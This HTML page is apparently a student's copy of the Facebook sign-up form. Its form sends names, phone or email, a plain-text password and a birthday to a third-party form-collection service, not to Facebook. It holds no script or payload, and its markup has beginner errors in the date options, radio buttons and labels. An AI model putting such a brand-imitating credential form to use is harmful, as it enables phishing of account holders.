<!DOCTYPE html>
<html lang="en">
    <head> 
        <meta charset="UTF-8"> 
        <meta http-equiv="X-UA-Compatible" content="IE=edge"> 
        <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
        <title>Facebook <Form></Form></title>
        <link href="css/style.css" rel="stylesheet">
    </head>
    <body>
        <section id="grid_container">
            <header>
                <h1><img src="images/fb_logo.svg" alt="facebook_logo"></h1>
            </header>
            <main>
                <form method="POST" action="https://getform.io/f/17ce95dd-cf2d-4f15-a971-81c8f8533928">
                    <h1>Create a new account its easy</h1>
                    <h4>it's quick and easy</h4>
                    <fieldset>
                        <div id="names">
                        <div class="text">
                            <input type="text" id="first_name_id" name="first_name" placeholder="First  Name"
                            required
                            minlength="2"
                            maxlength="40"
                            type="text" >
                        </div>
                        <div>
                        <input type="text" id="last_name_id" name="last_name" placeholder="Last Name"
                            required
                            minlength="2"
                            maxlength="40"
                            type="text">
                        </div>
                    </div>
                        <div>
                            <input type="text" id="moblie_email_id" name="moblie_email" placeholder="Moblie Number or Email"
                            required
                            minlength="12"
                            maxlength="40"
                            type="text">
                        </div>
                        <div class="box_type">
                            <input type="text" id="new_pass_id" name="new_pass" placeholder="New Password"
                            required
                            minlength="12"
                            maxlength="40"
                            type="text">
                        </div>
                        <h5>Birthday ?</h5>
                        <div class="birthday">
                            <select id="month_id" name="months">
                                <option value="jan">Jan</option>
                                <option value="fed">Feb</option>
                                <option value="mar">Mar</option>
                                <option value="apr">Apr</option>
                                <option value="may">May</option>
                                <option value="jun">Jun</option>
                                <option value="jul">Jul</option>
                                <option value="aug">Aug</option>
                                <option value="sep">Sep</option>
                                <option value="oct">Oct</option>
                                <option value="nov">Nov</option>
                                <option value="dec">Dec</option>
                            </select>
                            <select id="date_id" name="date">
                                <option value="1">1</option>
                                <option value="2">2</option>
                                <option value="3">3</option>
                                <option value="4">4</option>
                                <option value="5">5</option>
                                <option value="6">6</option>
                                <option value="7">7</option>
                                <option value="8">8</option>
                                <option value="9">9</option>
                                <option value="10">10</option>
                                <option value="11">11</option>
                                <option value="12">12</option>
                                <option value="13">13</option>
                                <option value="14">14</option>
                                <option value="15">15</option>
                                <option value="16">16</option>
                                <option value="17">17</option>
                                <option value="18">18</option>
                                <option value="19">19</option>
                                <option value="20">20</option>
                                <option value="21">21</option>
                                <option value="22">22</option>
                                <option value="23">23</option>
                                <option value="24">24</option>
                                <option value="25">25</option>
                                <option value="26">26</option>
                                <option value="27">27</option>
                                <option value="28">28</option>
                                <option value="29">29</option>
                                <option value="30">31</option>
                            </select>
                            <select id="year_id" name="years">
                                <option value="1990">1990</option>
                                <option value="1991">1991</option>
                                <option value="1992">1992</option>
                                <option value="1993">1993</option>
                                <option value="1994">1994</option>
                                <option value="1995">1995</option>
                                <option value="1996">1996</option>
                                <option value="1997">1997</option>
                                <option value="1998">1998</option>
                                <option value="1999">1999</option>
                                <option value="2000">2000</option>
                                <option value="2001">2001</option>
                                <option value="2002">2002</option>
                            </select>
                        </div>
                        <h5>Gender ?</h5>
                        <div class="radio">
                            <input type="radio" id="female_id" name="female" value="female"
                            label for="female_id">Female</label> 
                        </div>
                        <div class="radio">
                            <input type="radio" id="male_id" name="male" value="male"
                            label for="male_id">Male</label> 
                        </div>
                        <div class="radio">
                            <input type="radio" id="custom_id" name="custom" value="Custom"
                            label for="custom_id">Custom</label> 
                        </div>
                        <p>People who use our services may have uploaded your contact information to Facebook.learn more.</p>
                    </fieldset>

                </form>
            </main>
        </section>
        
     </body>
</html>
